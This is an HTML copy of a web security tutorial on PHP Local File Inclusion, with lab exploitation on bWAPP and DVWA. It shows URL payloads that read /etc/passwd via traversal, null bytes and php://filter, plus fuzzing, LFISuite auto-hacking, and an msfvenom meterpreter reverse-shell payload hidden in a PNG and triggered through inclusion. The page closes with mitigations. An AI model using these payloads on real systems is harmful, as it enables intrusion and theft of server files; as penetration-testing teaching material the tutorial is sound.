@@ -1,0 +1,246 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
+            <h1 class="post-title entry-title">Comprehensive Guide on Local File Inclusion (LFI)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/" rel="bookmark"><time class="entry-date published" datetime="2020-07-03T18:07:44+00:00">July 3, 2020</time><time class="updated" datetime="2025-05-26T14:14:40+00:00">May 26, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this deep down online world, dynamic web-applications are the ones that can easily be breached by an attacker due to their loosely written server-side codes and misconfigured system files. Today, we will learn about File Inclusion, which is considered as one of the most critical vulnerability that somewhere allows an attacker to manipulate the target’s web server by including malicious files remotely or even access sensitive files present onto that server.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><strong><span style="color: #000000;">Introduction</span></strong></li>
+<li><strong><span style="color: #000000;">PHP Functions</span></strong>
+<ul>
+<li><span style="color: #000000;">Include() function</span></li>
+<li><span style="color: #000000;">Require() function</span></li>
+<li><span style="color: #000000;">Require-once() function</span></li>
+</ul>
+</li>
+<li><strong><span style="color: #000000;">Local File Inclusion</span></strong></li>
+<li><strong><span style="color: #000000;">LFI Exploitation</span></strong>
+<ul>
+<li><span style="color: #000000;">Basic LFI Attack</span></li>
+<li><span style="color: #000000;">Null byte Attack</span></li>
+<li><span style="color: #000000;">Base64 Attack</span></li>
+<li><span style="color: #000000;">Fuzzing Attack</span></li>
+<li><span style="color: #000000;">LFI Suite</span></li>
+<li><span style="color: #000000;">LFI over File UPload</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Mitigation</span></li>
+</ul>
+<h3><span style="color: #800000;">Introduction</span></h3>
+<p><span style="color: #000000;">File Inclusion vulnerabilities are commonly found in poorly written PHP web-applications where the input parameters are not properly sanitized or validated. Therefore it becomes easy for an attacker to capture the passing HTTP Requests, manipulates the URL parameter that accepts a filename and include the malicious files in the web-server.</span></p>
+<p><span style="color: #000000;">In order to understand the mechanism, let’s take a look at this scenario.</span></p>
+<p><span style="color: #000000;">Consider a web-application that accepts a parameter that says <strong>“file=hackingarticles.php”</strong> via its URL, the server further processes it and displays its content on the application’s screen.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NUU-e676uXs/Xv9omz82qVI/AAAAAAAAlLo/vSy5yplUIvcRKlawwCjrxSGPXrPRHUPRwCLcBGAsYHQ/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Now the attacker tries to manipulate the filename parameter and calls up a local file or even injects a malicious script or a payload calling it from his own website into that parameter, thus the web-server will process it and executes that particular file which might lead to the following attacks:</span></p>
+<ul>
+<li><span style="color: #000000;">Code execution on the Web server</span></li>
+<li><span style="color: #000000;">Cross-Site Scripting Attacks (XSS)</span></li>
+<li><span style="color: #000000;">Denial of service (DOS)</span></li>
+<li><span style="color: #000000;">Data Manipulation Attacks</span></li>
+<li><span style="color: #000000;">Sensitive Information Disclosure</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_uOSZDjbCPI/Xv9oqka9NsI/AAAAAAAAlLs/ezkBJGTWszgXPkchAtYMsrawC26n_8qRQCLcBGAsYHQ/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">The impact of this vulnerability is quite high and has therefore been reported under-</span></p>
+<ol>
+<li><span style="color: #000000;"><strong>CWE-98: “Improper Control of Filename for Include/Require Statement in PHP Program”</strong></span></li>
+<li><span style="color: #000000;"><strong>CWE-20: “Improper Input Validation”</strong></span></li>
+<li><span style="color: #000000;"><strong>CWE-22: “Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)”</strong></span></li>
+<li><span style="color: #000000;"><strong>CWE-23: “Relative Path Traversal”</strong></span></li>
+<li><span style="color: #000000;"><strong>CWE-200: “Exposure of Sensitive Information to an Unauthorized Actor”</strong></span></li>
+</ol>
+<p><span style="color: #000000;">The File Inclusion attacks are of two types:</span></p>
+<ol>
+<li><span style="color: #000000;"><strong>Local File Inclusion (LFI)</strong></span></li>
+<li><span style="color: #000000;"><strong>Remote File Inclusion (RFI)</strong></span></li>
+</ol>
+<p><span style="color: #000000;">Before we get into the depth of these file inclusion attacks, let’s have a look at some of the PHP functions.</span></p>
+<h3><span style="color: #800000;">PHP Include() Function</span></h3>
+<p><span style="color: #000000;">We can insert the content of one PHP file into another PHP file before the server executes it, with the include() function. The function can be used to create functions, headers, footers or element that will be reused on multiple pages.</span></p>
+<p><span style="color: #000000;">This will help the developers to make it easy to change the layout of a complete website with minimal effort i.e. if there is any change required then instead of changing thousands of files just change the included PHP file.</span></p>
+<p><strong><span style="color: #000000;">Example 1</span></strong></p>
+<p><span style="color: #000000;">Assume we have a standard footer file called “<strong>footer.php</strong>“, that looks like this</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?php
+echo "&lt;p&gt;Copyright &amp;copy; 2010-" . date("Y") ."hackingartices.in&lt;/p&gt;";
+?&gt;</pre>
+<p><span style="color: #000000;">To include the footer file on our page, we’ll be using the include statement.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Welcome to Hacking Articles&lt;/h1&gt;
+&lt;p&gt;Some text.&lt;/p&gt;
+&lt;p&gt;Some more text.&lt;/p&gt;
+&lt;?php include 'footer.php';?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+<p><span style="color: #000000;">The code within the included file (footer.php) is interpreted just as if it had been inserted into the main page.</span></p>
+<p><strong><span style="color: #000000;">Example 2</span></strong></p>
+<p><span style="color: #000000;">Assume we have a file called “<strong>vars.php</strong>“, with some variables defined:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">?php
+$color='red';
+$car='BMW';
+?&gt;</pre>
+<h5><strong><span style="color: #000000;">Test.php</span></strong></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Welcome to my Home Page!!&lt;/h1&gt;
+&lt;?php
+echo "A$color$car";  //Output A
+include 'var.php';
+echo "A$color$car";  //A red BMW
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+<p><span style="color: #000000;">As soon as the fifth line executes in the test.php file, just “A” will be printed out because we haven’t called our var.php script yet. Whereas in the next line, we have used the include function to include the var.php file, as soon as the interpreter reads this line it directly calls our file from the server and executes it.</span></p>
+<p><span style="color: #000000;">Therefore the variables “colour” and “car” are now assigned with “red” and “BMW”. As the last line runs, we’ll get the output as “A red BMW”.</span></p>
+<h3><span style="color: #800000;">PHP Require() Function</span></h3>
+<p><span style="color: #000000;">Similar to the include() function, the <strong>require</strong> statement is also used to include a file into the PHP code. However, there is a one big difference between include and require functions. When a file is included with the <strong>include</strong> statement and PHP cannot find it or load it properly, thus the include() function generates a warning but the script will continue to execute:</span></p>
+<h4><span style="color: #000000;">Example 3</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Welcome to my home page!&lt;/h1&gt;
+&lt;?php include 'noFileExists.php';
+echo "I have a $color $car.";
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+<h5><span style="color: #000000;"><strong>Output: I have a Red BMW</strong></span></h5>
+<p><span style="color: #000000;">Now if we try to run the same code using the <strong>require</strong> function, the echo statement will not be executed because the script execution dies as soon as the require statement return a fatal error:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Welcome to my home page!&lt;/h1&gt;
+&lt;?php require 'noFileExists.php';
+echo "I have a $color $car.";
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+<p><span style="color: #000000;">No output result.</span></p>
+<h3><span style="color: #800000;">PHP Require_once() Function</span></h3>
+<p><span style="color: #000000;"><strong>We can use the Require_once() function </strong>to access the data of another page into our page but only once. It works in a similar way as the require() function do. The only difference between require and require_once is that, if it is found that the file has already been included in the page, then the calling script is going to ignore further inclusions.</span></p>
+<p><span style="color: #000000;"><strong>Example 4</strong></span></p>
+<p><strong><span style="color: #000000;">echo.php</span></strong></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?php
+echo "Hello";
+?&gt;</pre>
+<h5><span style="color: #000000;">Test.php</span></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?php
+require('echo.php');
+require_once('echo.php');
+?&gt;</pre>
+<p><span style="color: #000000;">Output: “Hello”</span></p>
+<h3><span style="color: #800000;">Local File Inclusion (LFI)</span></h3>
+<p><span style="color: #000000;">Local file inclusion is the vulnerability in which an attacker tries to trick the web-application by including the files that are already present locally into the server. It arises when a php file contains some php functions such as “include”, “include_once”, “require”, “require_once”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-c91vYqx1IHg/Xv9oxFgEiNI/AAAAAAAAlME/y2oeypIPl14XJ6r82Fgtgob3B_wERFaPQCLcBGAsYHQ/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">This vulnerability occurs, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Thus, the local file inclusion has <strong>“High Severity with a CVSS Score of 8.1”</strong></span></p>
+<p><span style="color: #000000;">Let’s try to exploit this LFI vulnerability through all the different ways we can, I have used two different platforms <strong>bWAPP</strong> and <strong>DVWA</strong> which contains the file inclusion vulnerability.</span></p>
+<h3><span style="color: #800000;">Basic Local file inclusion</span></h3>
+<p><span style="color: #000000;">We’ll open the target IP in our browser and login inside BWAPP as a <strong>bee : bug</strong>, further we will set the <strong>“choose your bug”</strong> option to <strong>Remote &amp; Local File Inclusion (RFI/LFI) </strong>and hit <strong>hack, </strong>even for this time we’ll keep our security level to “low”.</span></p>
+<p><span style="color: #000000;">Now, we’ll be redirected to the web page which is basically suffering from RFI &amp; LFI Vulnerability. There we will find a comment section to select a language from the given drop-down list, as soon as we click on go button, the selected language file gets included into the URL.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3QfxxC2g2_k/Xv9o1MmdiWI/AAAAAAAAlMI/dyeyORxTpe0VaYUFmqSoTF3UBayuookDQCLcBGAsYHQ/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">In order to perform the basic LFI attack, we’ll be manipulating the <strong>“URL language parameter”</strong> with <strong>“/etc/passwd” </strong>to access the password file present in the local system as:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.0.11/bWAPP/rlfi.php?language=/etc/passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PiPbpbDoyc4/Xv9o5fnzO_I/AAAAAAAAlMQ/0ge9VPN_Vg0KQKiFr9mQ_LFzHMVCGvZbgCLcBGAsYHQ/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">So we’ve successfully get into the password file and we are able to read this sensitive information directly from the webpage. Similarly we can even read the contents of the other files using <strong>“/etc/shadow” </strong>or <strong>“/etc/group”</strong></span></p>
+<h3><span style="color: #800000;">Null byte</span></h3>
+<p><span style="color: #000000;">In many scenarios, the basic local file inclusion attack might not work, due to the high-security configurations. From the below image you can observe that, I got failed to read the password file when executing the same path in the URL.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lS2fMp06hrg/Xv9qM-OzxRI/AAAAAAAAlNY/SgWFWZmNgE0YGaqn-H0ZYA2rvi8BKihqgCLcBGAsYHQ/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">So what should we do when we got stuck in some similar situations?</span></p>
+<p><span style="color: #000000;">The answer is to go for the Null Byte Attack. Many developers add up a <strong>‘.php’ </strong>extension into their codes at the end of the required variable before it gets included.</span></p>
+<p><span style="color: #000000;">Therefore the webserver is interpreting <strong>/etc/passwd</strong> as <strong>/etc/passwd.php</strong>, thus we are not able to access the file. To get rid of this .php, we try to terminate the variable by using the null byte character (%00) that forces the php server to ignore everything after that as soon as it interprets it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.0.11/bWAPP/rlfi.php?language=/etc/passwd%00</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8qqOwUcMo68/Xv9qU_iqQtI/AAAAAAAAlNc/_MWoSWuGWLkxYyMTKMgzSgO_NhZsO_CSgCLcBGAsYHQ/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Great, we are back!! We can read the contents of the password file again.</span></p>
+<p><span style="color: #000000;">You can even grab the same using <strong>burpsuite, </strong>by simply capturing the browser’s request in the proxy tab, manipulating its URL with <strong>/etc/passwd%00 </strong>and forwarding it all to the repeater. Inside repeater, we can do a deep analysis of the sent requests and responses generated through it.</span></p>
+<p><span style="color: #000000;">Now we just need to click on the <strong>go tab</strong>. And on the right side of the window, you can see that the password file is opened as a response.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-32lZLOd2s10/Xv9qcIY32JI/AAAAAAAAlNk/aFCG_P-ZeEoK10e1Ur0KoAz9s2RSbdDdQCLcBGAsYHQ/s1600/8.png"/></span></p>
+<h3><span style="color: #800000;">Base64 encoded</span></h3>
+<p><span style="color: #000000;">Sometimes the security configuration is much high and we’re unable to view the contents of the included PHP file. Thus we can still exploit the LFI vulnerability by just using the following PHP function.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.0.11/bWAPP/rlfi.php?language=php://filter/read=convert.base64-encode/resource=/etc/passwd</pre>
+<p><span style="color: #000000;">Therefore from the below screenshot you can determine that the contents of the password file is encoded in base64. Copy the whole encoded text and try to decode it with any base64 decoder.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-EEv3YDTOW0Y/Xv9rPhoKQ8I/AAAAAAAAlN8/C52z-ubJAgsnL6BfIGNtb_RYZEWUsWH5QCLcBGAsYHQ/s1600/9.png"/></strong></span></p>
+<p><span style="color: #000000;">I’ve used the <strong>burpsuite decoder</strong> in order to decode the above-copied text.</span></p>
+<p><span style="color: #000000;">Go to the <strong>Decoder</strong> option in burpsuite and paste the copied base64 text into the field provided, now on the right-hand side click on <strong>decode as</strong> and choose <strong>Base64</strong> from the options presented.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-d4_0VysnBSo/Xv9rVqAdQjI/AAAAAAAAlOE/5hfVRDSaoF4ywnfpznwRTUuOMUdVbGHmQCLcBGAsYHQ/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">And here we go, you can see that we have successfully grabbed the password file again.</span></p>
+<h3><span style="color: #800000;">Fuzzing</span></h3>
+<p><span style="color: #000000;">Many times it is not possible to check for all these scenarios manually, and even sometimes our included file might not be there in the root directory. Thus in order to deface the website through the LFI vulnerability, we need to traverse back and find the actual path to that included file. This traversing can contain a lot of permutation and combinations, therefore we’ll make a dictionary with all the possible conditions and will simply include it in our attack.</span></p>
+<p><span style="color: #000000;">From the below screenshot, you can see that I’ve send the intercepted request to the <strong>intruder</strong> with a simple right-click in the proxy tab and further selecting the <strong>send to intruder</strong> option<strong>.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dzqZVsGXryU/Xv9rbJ2EyNI/AAAAAAAAlOI/bGDF4qLUZZoVwyd9HUUq6TFOBPOt29QwACLcBGAsYHQ/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Now we need to load our dictionary file into the <strong>payload section</strong> and set the payload type to <strong>Simple list</strong> as highlighted in the below image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CNxV0fMO8_s/Xv9rfLUK6tI/AAAAAAAAlOM/XP4_a99e_hc_VayIYa-IR9R-mCQmW_vZwCLcBGAsYHQ/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">So, we are almost done. We just set the payload position to our input value parameter and simply click the “Start Attack” button to launch our fuzzing attack.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lxvpNjYjGlU/Xv9riwdlNMI/AAAAAAAAlOQ/UUT4eTOylJAq-CpAm3MID0ffuwDkvg8xgCLcBGAsYHQ/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">From the below image we can see that our attack has been started and there is a fluctuation in the length section. As soon as we find any increment in any of the supplied input condition. We’ll check its response to reading the contents of the included file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3Snr0p31qfo/Xv9rnISkDSI/AAAAAAAAlOY/Q-RhYWwJ-HwbghblhdbBiFmEA1M4nc_owCLcBGAsYHQ/s1600/14.png"/></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OpmYUazksZw/Xv9ryH5_YII/AAAAAAAAlOk/fjGBUy21yZ4o23SLmTlVKALCvg0-TiZxgCLcBGAsYHQ/s1600/15.png"/></span></p>
+<h3><span style="color: #800000;">LFI Suite</span></h3>
+<p><span style="color: #000000;">Sometimes it becomes a bit frustrating while performing the LFI attack using Burp suite, i.e. wait for the incremented length and check for every possible response it shows. In order to make this task somewhat simpler and faster, we’ll be using an amazing automated tool called <strong>LFI Suite</strong>. This helps us to scan the web site’s URL and if found vulnerable. It displays all the possible results, therefore we can use it to gain the website’s remote shell. You can download this from here.</span></p>
+<p><span style="color: #000000;">Firstly we’ll clone the LFI suite and boot it up in our kali machine using the following code:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/D35m0nd142/LFISuite.git
+cd LFISuite
+python lfisuite.py</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-75mF_2HZ4YQ/Xv9r2Q25zVI/AAAAAAAAlOo/Dob0ZlMp0xY0YSChWW7xHVp8ebAttCqfgCLcBGAsYHQ/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Choose the 2<sup>nd</sup> option as <strong>“Scanner”</strong> in order to check the possible input parameters.</span></p>
+<p><span style="color: #000000;">Now it ask us to <strong>“enter the cookies”</strong>, I’ve installed the “<strong>HTTP Header live</strong>” plugin to capture the HTTP passing requests.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y7bOIFkOIhk/Xv9r76t5zBI/AAAAAAAAlOw/IL7Ck9kd9kM5Bvo0hi4CO5u2jLLsJok7gCLcBGAsYHQ/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">From the below image you can see that I’ve copied the captured cookies into the cookies field and disable the Tor proxy. We just need to enter the website’s URL and hit enter.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u66mmH5jWa4/Xv9r_k3n5-I/AAAAAAAAlO0/brHo11c6z6w7rstOisIEZHsRbHmKzKTZQCLcBGAsYHQ/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">Now we have started the attack and we can see that we can exploit the LFI vulnerability in our web application through 40 different parameters.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2b2sJ4-SlOA/Xv9sDrGVWwI/AAAAAAAAlO8/QaAJvmtUkdsalAaFmB6aPsuLBfq87tJTQCLcBGAsYHQ/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">Now it’s time to connect to the victim and deface the website by capturing its remote shell.</span></p>
+<p><span style="color: #000000;">Restart the application and this time choose option <strong>1 </strong>as “<strong>Exploiter”. </strong>Enter the required fields with the same <strong>cookies </strong>that we’ve used in the scanner section and set the Tor proxy to <strong>“No”.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wLncVxjYszc/Xv9sHAg2IRI/AAAAAAAAlPA/N9oSsB2CEI0AkH-94hRRsjsExc0otlwrwCLcBGAsYHQ/s1600/20.png"/></span></p>
+<p><span style="color: #000000;"> As soon as you hit enter, you’ll find a list with multiple ways to attack the webserver.</span></p>
+<p><span style="color: #000000;">Select the option <strong>9 </strong>as <strong>“Auto Hack”. </strong></span></p>
+<p><span style="color: #000000;">A new section will pop-up asking for the web site’s URL, here enter the target website and hit <strong>enter.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.0.11/bWAPP/rlfi.php?language=</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-71EKVxWGgSs/Xv9sK2g5diI/AAAAAAAAlPE/fjx2ZXFlkB4SMu940h3mIsTKUQqloGrAgCLcBGAsYHQ/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">Cool!! We’ve successfully captured the victim’s command shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MTBxEjUyQBw/Xv9sQftyWvI/AAAAAAAAlPI/EYXkbZKNJ6gC25Ppv-8ktOxjtDx_eUuZQCLcBGAsYHQ/s1600/22.png"/></span></p>
+<h3><span style="color: #800000;">LFI over File Upload</span></h3>
+<p><span style="color: #000000;">As we all are aware, the File Upload vulnerability allows an attacker to upload a file containing malicious code that can execute on the server. You can learn more about this vulnerability from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/comprehensive-guide-on-unrestricted-file-upload/">here</a></strong></span>.</span></p>
+<div class="output-content"><span style="color: #000000;">But what, if someone patches the web server with the file upload vulnerability using high security?</span></div>
+<p><span style="color: #000000;">Not a big issue. We just need an unpatched file inclusion vulnerability into that. Therefore we can bypass its high security through the <strong>file inclusion vulnerability</strong> and even get the reverse connection of victim’s server.</span></p>
+<p><span style="color: #000000;">Let’s check it out how.</span></p>
+<p><span style="color: #000000;">Firstly I’ve downloaded an image <strong>raj.png </strong>and saved it on my desktop.</span></p>
+<p><span style="color: #000000;">Now I’ll open the terminal and type following command to generate a <strong>malicious PHP code inside “raj.png”</strong> image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.9 lport=4444 &gt;&gt; /home/hackingarticles/Desktop/raj.png</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PJwQdQKrWCw/Xv9sVG9L6II/AAAAAAAAlPQ/JL9DVRgtacYhrdAM1Xu607JJsqEane8RgCLcBGAsYHQ/s1600/23.png"/></span></p>
+<p><span style="color: #000000;">Let’s verify whether our injected code is in the image or not.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /home/hackingarticles/Desktop/raj.png</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cxsrLgKsARk/Xv9sZilMXVI/AAAAAAAAlPU/vl10NwZLHes88-880wUdKjmRHvmMSnkEgCLcBGAsYHQ/s1600/24.png"/></span></p>
+<p><span style="color: #000000;">At the bottom, you will find that the image is having the PHP code in it. This means that our malicious image is ready, and we are now able to upload it over the web application.</span></p>
+<p><span style="color: #000000;">Now explore the target’s IP in browser and login into <strong>DVWA </strong>with <strong>security level high.</strong> Choose the vulnerability as a <strong>file upload</strong> in order to upload the malicious image into the web-applications server.</span></p>
+<p><span style="color: #000000;">From the given screenshot, you can see “r<strong>aj.png</strong>” image is <strong>successfully uploaded</strong>.</span></p>
+<p><span style="color: #000000;"><strong>Copy </strong>the highlighted <strong>path</strong> where the image is uploaded.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-e1ZAgXurhyY/Xv9sdTGYS3I/AAAAAAAAlPc/V0TLyU_Q33w47xiKSD7dOluUPs_FOs3GACLcBGAsYHQ/s1600/25.png"/></span></p>
+<p><span style="color: #000000;">Before executing the image, we’ll <strong>boot the Metasploit framework</strong> inside the Kali Linux and start-up <strong>multi/handler.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use multi/handler
+msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set lhost 192.168.0.9
+msf exploit(handler) &gt; set lport 4444
+msf exploit(handler) &gt; exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bzayxQJcNZY/Xv9shGxjO4I/AAAAAAAAlPk/658cVIn_PoUreRqC_K2CYJr0ccK12DoRQCLcBGAsYHQ/s1600/26.png"/></span></p>
+<p><span style="color: #000000;">Now we’ll get back to DVWA and set <strong>security level low</strong> and will <strong>turn on the File Inclusion vulnerability</strong>. This time we will again manipulate the URL parameter <strong>“page=”</strong> by <strong>pasting </strong>the above-copied<strong> path</strong><strong> of uploaded image. </strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.0.11/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/raj.png</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--g_daNT3YMY/Xv9sk5lmQmI/AAAAAAAAlPs/2tkQrC6ilG84auRkV7E_o_LbCcqDNGNBwCLcBGAsYHQ/s1600/27.png"/></span></p>
+<p><span style="color: #000000;">As soon as the URL loads up into the browser, we will get the<strong> reverse connection</strong> of the server in our Kali machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-J4SHUprjHsg/Xv9sohOiR7I/AAAAAAAAlPw/9kTT9ddO0UMiBZhFaRlZ0CyzPxEDAX-fgCLcBGAsYHQ/s1600/28.png"/></span></p>
+<h3><span style="color: #800000;">Mitigations to File Inclusion Attacks</span></h3>
+<p><span style="color: #000000;">To prevent file inclusion attacks on our website, we must implement strong input validations. Instead of letting anyone include any file in our web application. We should restrict our input parameter to accept a whitelist of acceptable files and reject all other inputs that do not strictly conform to specifications.</span></p>
+<p><span style="color: #000000;">We can examine this all with the following code snippet.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-sIDWTAFn71A/Xv9s5HvelnI/AAAAAAAAlQE/7jKIm7_TSNIK_IPUIx22BVZnxFmpQ8ltgCLcBGAsYHQ/s1600/32.png"/></p>
+<p><span style="color: #000000;">From the above image you can see that, there is an <strong>if condition. </strong>Which is only allowing the whitelisted files and replaying all the other files with <strong>“ERROR: File not Found!”</strong></span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-da5YrvuZHbM/Xv9s8gUGY-I/AAAAAAAAlQI/Dk8h5D-iHHsOJjEegPAzc_tJNrGCM6pZwCLcBGAsYHQ/s1600/33.png"/></p>
+<p><span style="color: #000000;">Exclude the directory separators “/” to prevent our web-application from the directory traversal attack which may further lead to the Local File Inclusion attacks.</span></p>
+<p><span style="color: #000000;">Develop or run the code in the most recent version of the PHP server which is available. And even configure the PHP applications so that it does not use register_globals.</span></p>
+<p><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
+<p><span style="color: #000000;"><strong>Source: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.w3schools.com/">https://www.w3schools.com/</a> </span></strong></span></p>
+<p><span style="color: #000000;">                 <span style="color: #0000ff;"><strong>https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion</strong></span></span></p>
+<p><span style="color: #0000ff;"><strong>                https://www.acunetix.com</strong></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Chiragh Arora is a passionate Researcher and Technical Writer at Hacking Articles. He is a hacking enthusiast. Contact <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/chiragh-arora/">here</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
